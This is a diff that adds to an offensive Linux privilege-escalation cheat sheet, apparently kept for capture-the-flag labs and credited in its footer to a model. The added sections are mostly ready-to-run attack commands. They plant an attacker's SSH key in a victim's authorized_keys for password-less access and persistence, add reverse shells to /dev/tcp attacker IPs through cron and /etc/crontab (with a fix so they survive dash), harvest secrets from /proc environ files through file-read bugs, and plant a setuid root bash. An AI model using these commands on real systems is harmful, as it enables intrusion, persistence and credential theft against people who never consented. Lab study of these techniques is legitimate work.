@@ -39,6 +39,48 @@ chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/out.txt
 
 ---
 
+## Stabilize First — Drop an SSH Key (no password needed)
+
+A raw reverse shell is fragile: no real TTY, dies on a dropped connection, breaks `sudo`/`su`/`vi`. If the box runs SSH (port 22) and you have write access to a user's home, **append your public key to their `~/.ssh/authorized_keys`** — then log in over SSH for a stable, fully-interactive session with **no password**. Public-key auth ignores the account password entirely, so this works even on accounts whose password you don't know (or that have none). It doubles as persistence.
+
+```bash
+# 1. On ATTACKER — generate a throwaway keypair
+ssh-keygen -t ed25519 -f ./id_key -N ''      # -N '' = no passphrase; creates id_key + id_key.pub
+cat id_key.pub                                # copy this line
+```
+
+```bash
+# 2. On TARGET (from your reverse shell) — drop the PUBLIC key into the victim user's authorized_keys.
+#    Create ~/.ssh with correct perms or sshd will silently refuse the key.
+mkdir -p ~/.ssh && chmod 700 ~/.ssh
+echo 'ssh-ed25519 AAAA... attacker' >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+# Targeting a specific user whose home you can write (e.g. after gaining their uid, or a world-writable home):
+mkdir -p /home/victim/.ssh && chmod 700 /home/victim/.ssh
+echo 'ssh-ed25519 AAAA... attacker' >> /home/victim/.ssh/authorized_keys
+chmod 600 /home/victim/.ssh/authorized_keys
+chown -R victim:victim /home/victim/.ssh     # ownership must match the user (if you're root/another uid)
+```
+
+```bash
+# 3. On ATTACKER — log in with the PRIVATE key → stable shell, no password
+chmod 600 id_key
+ssh -i id_key victim@<target>
+```
+
+> [!warning] `sshd` **rejects keys if permissions are loose**: `~/.ssh` must be `700`, `authorized_keys` `600`, and both owned by that user. A key that "doesn't work" is almost always a perms/ownership problem (check `/var/log/auth.log`), or `PubkeyAuthentication no` / `AuthorizedKeysFile` overridden in `sshd_config`. Root's key goes in `/root/.ssh/authorized_keys`.
+
+> [!warning] **Key works but the session closes instantly** — that's *not* an auth failure. `Last login: … / Never logged in` only prints **after** successful authentication, so if you see it and then get dropped, auth succeeded and a **broken login script** killed the shell. `/etc/profile`, `/etc/profile.d/*.sh`, and `~/.bash_profile`/`~/.profile` are sourced only for **login** shells; if one runs a command that fails (classic: a `lastlog`/`lastlog2` call on a box where it isn't installed) while `set -e`/`errexit` is active, the login shell exits and closes the connection. Sidestep it with a **non-login** shell:
+> ```bash
+> ssh -t -i id_key victim@<target> bash --noprofile --norc
+> ```
+> `-t` forces an interactive PTY; `--noprofile --norc` skips `/etc/profile` and the rc files entirely. Confirm the cause from your RCE shell: `grep <victim> /etc/passwd` (odd login shell?) and `grep -rn lastlog /etc/profile /etc/profile.d ~/.bash* 2>/dev/null`.
+
+> [!tip] Related uses of the same primitive: if you can only **read** files (LFI/arbitrary read), grab an existing `~/.ssh/id_rsa`/`id_ed25519` private key and log in as-is. Dropping *your* key is the write-primitive version, and is also listed under [[#Post-Exploitation — Persistence]]. For upgrading a shell you can't SSH-replace, see [[Shells & Payloads]] (TTY upgrade).
+
+---
+
 ## Initial Enumeration
 
 ### System Info
@@ -365,6 +407,16 @@ cat > /path/to/script.sh << 'EOF'
 bash -i >& /dev/tcp/10.10.14.x/4444 0>&1
 EOF
 ```
+
+> [!warning] **`/dev/tcp/host/port` is a bash-ism — `sh`/dash can't parse it, and cron uses `/bin/sh`.**
+> `>& /dev/tcp/...` is parsed by *whatever shell reads the line* — and cron's default shell is `/bin/sh` (**dash** on Debian/Ubuntu). So `* * * * * bash -i >& /dev/tcp/...` fails **silently**: dash sees the `>&` first and tries to open `/dev/tcp/...` as a literal file, and in a cron context there's no terminal to show the error. Same trap for any `#!/bin/sh` script and any scheduler/`--command` field (custom sudo-able cron tools, `at`).
+> **Fix — wrap it so bash parses its own redirection:**
+> ```bash
+> * * * * * root bash -c 'bash -i >& /dev/tcp/10.10.15.212/9002 0>&1'
+> # custom scheduler tool: --command "bash -c 'bash -i >& /dev/tcp/10.10.15.212/9002 0>&1'"
+> ```
+> The outer dash just execs `bash -c '...'` (a simple command it has no trouble with); the inner bash does the `/dev/tcp` redirection natively. Alternatively put `SHELL=/bin/bash` at the top of the crontab.
+> **When a cron shell "won't fire," sanity-check the boring things:** listener actually running (`nc -lvnp 9002`), your VPN IP still current (`ip a` on `tun0`), and the job's timing/permissions.
 
 ### Writable directory in cron PATH
 
@@ -767,6 +819,8 @@ cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass
 printenv                    # Current environment variables
 ```
 
+> [!tip] No shell yet? You can harvest these same env-var secrets with just an **LFI / arbitrary file-read** — read `/proc/self/environ` (the web process) and `/proc/<pid>/environ` (other processes, if readable) for DB creds, API keys, `SECRET_KEY`, and the deploy path. Full technique: [[File Inclusion]] → *`/proc/self/environ`*.
+
 ### Writable .bashrc / .bash_profile
 
 ```bash
@@ -1020,8 +1074,8 @@ cp /bin/bash /tmp/.rootbash
 chmod +s /tmp/.rootbash
 /tmp/.rootbash -p
 
-# Root cron reverse shell
-echo '* * * * * root bash -i >& /dev/tcp/10.10.14.x/4444 0>&1' >> /etc/crontab
+# Root cron reverse shell — MUST wrap in `bash -c` (cron's /bin/sh=dash can't parse /dev/tcp; see Cron Jobs warning)
+echo "* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1'" >> /etc/crontab
 ```
 
 ---
@@ -1107,5 +1161,5 @@ KERNEL (last resort — can panic the host)
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-08-13*
+*Updated: 2026-08-14*
 *Model: claude-opus-5*
